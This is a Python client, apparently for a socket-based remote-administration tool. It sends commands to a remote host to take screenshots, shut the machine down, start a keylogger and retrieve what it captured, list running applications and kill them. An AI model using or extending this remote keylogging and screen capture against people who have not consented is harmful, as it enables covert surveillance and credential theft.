import socket
from PIL import Image
import io

HEADER = 64
PORT = 5050
SERVER = ""
FORMAT = 'utf-8'
DISCONNECT_MSG = "!DISCONNECT"
SCREENSHOT_MSG = "!SCREENSHOT"
SHUTDOWN_MSG = "!SHUTDOWN"
KEYLOG_MSG = "!KEYLOG"
GETAPP_MSG = "!GETAPP"
KILLAPP_MSG = "!KILLAPP"

keylog_on = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def send(msg):
    message = msg.encode(FORMAT)
    msg_len = str(len(message)).encode(FORMAT) 
    msg_len += (b' '*(HEADER - len(msg_len)))
    client.send(msg_len)
    client.send(message)

def receive_screenshot():
    length = int(client.recv(HEADER).decode(FORMAT))
    screenshot_bytes = b''
    while length > 0:
        data = client.recv(min(length, 4096))
        if not data:
            break
        screenshot_bytes += data
        length -= len(data)
    return screenshot_bytes

def display_screenshot(image_bytes):
    if not image_bytes:
        print("Error: No screenshot data received.")
        return
    image_streamIO = io.BytesIO(image_bytes)
    image_streamIO.seek(0)
    image = Image.open(image_streamIO)
    image.show()

def receive():
    msg_len = client.recv(HEADER).decode(FORMAT)
    if msg_len:
        msg_len = int(msg_len)
        msg = client.recv(msg_len).decode(FORMAT)
        return msg
    return ""

def receiveAppList():
    appList_len = int(receive())
    applist = []
    for i in range(appList_len):
        item = []
        for j in range(4):
            item.append(receive())
        applist.append({"description": item[0], "app_id": item[1], "path": (item[2]), "thread": item[3]})
    print("Applist received")
    for item in applist:
        print(item)


def start():
    while True:
        msg = input("Enter a message (type '!SCREENSHOT' to request a screenshot or '!DISCONNECT' to quit): ")
        global keylog_on
        send(msg)
        if msg == DISCONNECT_MSG or msg == SHUTDOWN_MSG:
            break           
        elif msg == SCREENSHOT_MSG:
            screenshot_data = receive_screenshot()
            display_screenshot(screenshot_data)
        elif msg == KEYLOG_MSG:
            if not keylog_on:
                keylog_on = True
            else:
                keylog_on = False
                print(f"Keylog: {receive()}")
        elif msg == GETAPP_MSG:
            receiveAppList()
        elif msg == KILLAPP_MSG:
            app_id = input("Enter app ID to kill: ")
            send(app_id)
            print(receive())

while True:
    try:
        SERVER = input("Enter host IP: ")
        client.connect((SERVER, PORT))
        start()
    except:
        print("Cannot connect to this host, please try again!")